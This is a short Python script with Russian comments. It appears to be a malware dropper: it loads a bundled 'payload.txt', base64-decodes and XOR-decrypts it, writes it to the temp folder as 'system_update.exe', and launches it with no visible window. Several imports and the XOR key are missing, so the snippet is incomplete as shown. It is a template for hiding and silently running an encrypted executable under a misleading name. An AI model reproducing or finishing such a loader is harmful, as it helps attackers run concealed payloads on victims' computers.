import sys

def run():
    # Получаем путь к вшитому файлу
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
        
    payload_path = os.path.join(base_path, "payload.txt")
    
    with open(payload_path, "rb") as f:
        encrypted = base64.b64decode(f.read())
    
    # Расшифровываем
    decrypted = bytes([b ^ key for b in encrypted])
    
    # Сохраняем и запускаем
    temp_dir = tempfile.gettempdir()
    exe_path = os.path.join(temp_dir, "system_update.exe")
    
    with open(exe_path, "wb") as f:
        f.write(decrypted)
        
    subprocess.Popen(exe_path, creationflags=subprocess.CREATE_NO_WINDOW)
